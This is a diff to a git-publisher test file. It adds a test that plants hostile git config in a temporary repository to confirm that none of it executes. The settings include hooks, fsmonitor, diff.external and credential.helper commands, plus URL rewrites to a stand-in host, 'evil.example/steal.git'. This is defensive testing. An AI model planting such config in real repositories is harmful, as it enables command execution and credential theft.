@@ -1345,9 +1345,10 @@ test('publisher object transfer never executes a hostile uploadpack.packObjectsH
   });
   assert.strictEqual(initRes.status, 0, 'clean clone init failed: ' + initRes.stderr);
 
-  // The production transfer path: mirror the worker tree with a LOCAL clone
-  // (no upload-pack), sanitize the mirror's config, then fetch from the
-  // mirror. upload-pack never reads the worker-writable config.
+  // The production transfer path: mirror the worker tree with a LOCAL clone,
+  // sanitize the mirror's config, then fetch from the mirror. Although the clone
+  // parses the worker-writable config, its config is rewritten before fetch so
+  // upload-pack never runs with the worker-writable config.
   transferReviewedObjects(repo.dir, repo.sha, cleanDir, tmp);
 
   // The reviewed objects arrived intact.
@@ -1366,6 +1367,76 @@ test('publisher object transfer never executes a hostile uploadpack.packObjectsH
   const mirrorCfg = fs.readFileSync(path.join(tmp, 'source-mirror', 'config'), 'utf8');
   assert.strictEqual(mirrorCfg, SAFE_MIRROR_CONFIG);
   assert.ok(!/uploadpack/i.test(mirrorCfg), 'mirror config must not carry uploadpack keys');
+
+  fs.rmSync(tmp, { recursive: true, force: true });
+  fs.rmSync(repo.dir, { recursive: true, force: true });
+});
+
+test('publisher does not leak worker environment or execute worker config/hooks', () => {
+  const repo = makeTempRepo();
+  const marker = path.join(os.tmpdir(), 'shipde-evil-marker-' + Date.now() + '.txt');
+
+  const g = (args) =>
+    spawnSync('git', args, { cwd: repo.dir, encoding: 'utf8', windowsHide: true });
+
+  // Plant a full suite of hostile config
+  g(['config', 'core.hooksPath', 'nul']); // or a planted path
+  g(['config', 'uploadpack.packObjectsHook', 'touch ' + marker]);
+  g(['config', 'include.path', '../evil.cfg']);
+  g(['config', 'credential.helper', '!touch ' + marker]);
+  g(['config', 'url.https://evil.example/steal.git.insteadOf', 'https://github.com/']);
+  g(['config', 'core.fsmonitor', 'touch ' + marker]);
+  g(['config', 'diff.external', 'touch ' + marker]);
+  g(['config', 'remote.origin.url', 'https://evil.example/steal.git']);
+
+  // Create the malformed file named by include.path
+  const evilCfgPath = path.join(repo.dir, 'evil.cfg');
+  fs.writeFileSync(evilCfgPath, '[invalid\n', 'utf8');
+
+  let tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shipde-evil-'));
+  let cleanDir = path.join(tmp, 'clean.git');
+  fs.mkdirSync(cleanDir);
+  spawnSync('git', ['init', '-q', '--bare', cleanDir], { encoding: 'utf8', windowsHide: true });
+
+  // 1. Verify object transfer with malformed include.path (residual risk: aborts the mirror clone)
+  assert.throws(
+    () => transferReviewedObjects(repo.dir, repo.sha, cleanDir, tmp),
+    /PUBLISH_FAILED: failed to mirror source tree/,
+    'worker-written include.path aborting the mirror clone must be surfaced as a bounded failure'
+  );
+
+  // 2. Remove the malformed include so the transfer can proceed and we can test the other hooks
+  fs.rmSync(evilCfgPath, { force: true });
+  g(['config', '--unset', 'include.path']);
+
+  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shipde-evil2-'));
+  cleanDir = path.join(tmp, 'clean2.git');
+  fs.mkdirSync(cleanDir);
+  spawnSync('git', ['init', '-q', '--bare', cleanDir], { encoding: 'utf8', windowsHide: true });
+
+  transferReviewedObjects(repo.dir, repo.sha, cleanDir, tmp);
+
+  // The reviewed objects arrived intact.
+  const shaRes = spawnSync('git', ['rev-parse', 'refs/heads/temp-push'], {
+    cwd: cleanDir,
+    encoding: 'utf8',
+    windowsHide: true,
+  });
+  assert.strictEqual(shaRes.status, 0, 'temp-push missing in clean clone');
+  assert.strictEqual(shaRes.stdout.trim(), repo.sha);
+
+  // No marker should be created - no hook or fsmonitor executed
+  assert.strictEqual(fs.existsSync(marker), false, 'hostile hook/config executed');
+
+  // 3. Test publisher environment
+  // The publisher runs in the operator process. The worker env (GIT_CONFIG_COUNT, etc)
+  // is only set inside run-target.ps1. We can assert that publish() does not pass
+  // any custom `env` block that would leak worker variables.
+  const src = fs.readFileSync(path.join(__dirname, '../publisher.js'), 'utf8');
+  assert.ok(
+    !src.includes('env:'),
+    'publisher runCommand must not pass custom env, ensuring it uses operator environment only'
+  );
 
   fs.rmSync(tmp, { recursive: true, force: true });
   fs.rmSync(repo.dir, { recursive: true, force: true });
